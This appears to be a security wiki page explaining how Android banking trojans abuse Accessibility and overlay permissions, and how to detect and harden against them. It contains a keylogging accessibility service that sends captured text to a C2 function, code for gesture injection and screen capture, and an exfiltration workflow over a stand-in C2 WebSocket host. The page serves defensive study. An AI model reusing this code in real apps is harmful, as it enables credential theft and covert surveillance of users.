# Abusing Accessibility & Overlay Permissions in Android

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> The techniques described here are **commonly abused by Android banking trojans** (e.g. SharkBot, Vultur, RedHook, etc.) to obtain **full remote control, real-time screen streaming and credential theft** on devices that are *not* rooted.

## Why Accessibility Service?

Android’s `AccessibilityService` was designed to help users with disabilities interact with the UI. Once the user activates the service (`ACTION_ACCESSIBILITY_SETTINGS`) the app receives **system-wide events** and can perform **gestures on behalf of the user**, effectively obtaining:

* Complete **UI automation** (click, long-click, swipe, text input)
* Access to **view hierarchy** → harvest on-screen text, package / activity names
* **Keylogging** – every `TYPE_VIEW_TEXT_CHANGED` / `TYPE_VIEW_FOCUSED` event leaks typed characters
* Bypass of many runtime permission dialogs because interactions are simulated for the user

### Manifest & Service skeleton

```xml
<!-- AndroidManifest.xml -->
<service
    android:name=".StealthService"
    android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
    android:exported="false">
    <intent-filter>
        <action android:name="android.accessibilityservice.AccessibilityService"/>
    </intent-filter>
    <meta-data
        android:name="android.accessibilityservice"
        android:resource="@xml/service_config"/>
</service>
```

```java
public class StealthService extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent e) {
        // Harvest keystrokes
        if (e.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String pkg  = String.valueOf(e.getPackageName());
            String text = String.valueOf(e.getText());
            sendToC2(pkg, text);
        }
    }

    @Override public void onInterrupt() {}

    /* Perform click at x,y */
    public void doClick(int x, int y) {
        Path p = new Path();
        p.moveTo(x, y);
        GestureDescription.StrokeDescription s = new GestureDescription.StrokeDescription(p, 0, 50);
        dispatchGesture(new GestureDescription.Builder().addStroke(s).build(), null, null);
    }
}
```

## Overlay (`SYSTEM_ALERT_WINDOW`) permission

Requesting `SYSTEM_ALERT_WINDOW` allows the malware to **draw over any foreground app**, enabling:

* **Phishing overlays** that perfectly mimic banking login or OTP dialogs
* Hiding the standard *"Enable accessibility?"* confirmation so the victim blindly accepts

Runtime request:

```java
startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
    Uri.parse("package:" + getPackageName())));
```

## Typical Exfiltration Workflow

1. Show fake login overlay, steal credentials
2. Accessibility-driven UI automation opens *Settings → Accessibility* and toggles the service itself
3. Device registers to C2 via REST (`/auth/login`) → receives JWT / client-id
4. Persistent **WebSocket** tunnel opened (`wss://c2.example/ws`) and kept alive with `ping/pong`
5. Numeric op-codes map to actions (example extracted from RedHook):
   * `10001` – collect device info
   * `10018` – start screen capture
   * `10026` – take picture with camera
   * `10034` – long click (gesture)

## Real-time Screen Streaming with `MediaProjection`

Even without root the attacker can record the screen by abusing the user-granted *media projection* consent dialog (again, auto-accepted via Accessibility):

```java
MediaProjectionManager mpm =
    (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
startActivityForResult(mpm.createScreenCaptureIntent(), 8008);

// …in onActivityResult …
mediaProjection = mpm.getMediaProjection(resultCode, data);
VirtualDisplay vd = mediaProjection.createVirtualDisplay(
    "live", 720, 1280, 320,
    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
    imageReader.getSurface(), null, null);
```

Each captured frame is JPEG-encoded and **streamed over the existing WebSocket** so the operator can guide the automated gestures in real time.

## Detecting This Abuse

1. adb shell `settings get secure enabled_accessibility_services`
2. Look for **non-system packages** with the `Accessibility` capability.
3. `adb shell dumpsys package <pkg>` → check for `SYSTEM_ALERT_WINDOW` in `requested permissions`.
4. Runtime monitoring (Frida/Xposed) of `AccessibilityService#dispatchGesture` & `MediaProjectionManager#createScreenCaptureIntent` calls.

## Hardening Recommendations

* From Android 13 the user must explicitly allow a *"restricted setting"* (`accessibility_api`
  or `SYSTEM_ALERT_WINDOW`) from **App Info** – ensure Play Store policy enforcement.
* Use **FLAG_SECURE** on sensitive activities to prevent screenshot & screen capture.
* Implement **onWindowFocusChanged** / `InputFilter` logic to refuse touches while the window is obscured (`filterTouchesWhenObscured=true`).
* Employ **behaviour-based MTD/EDR** capable of detecting background WebSocket beacons & gesture injection anomalies.

## Further Reading

* Android developer docs on [AccessibilityService](https://developer.android.com/guide/topics/ui/accessibility/service)
* Android developer docs on [SYSTEM_ALERT_WINDOW](https://developer.android.com/reference/android/Manifest.permission#SYSTEM_ALERT_WINDOW)
* Android developer docs on [MediaProjection](https://developer.android.com/reference/android/media/projection/MediaProjection)

## References

- [RedHook: A New Android Banking Trojan Targeting Users in Vietnam](https://cyble.com/blog/redhook-new-android-banking-targeting-in-vietnam/)

{{#include ../../banners/hacktricks-training.md}}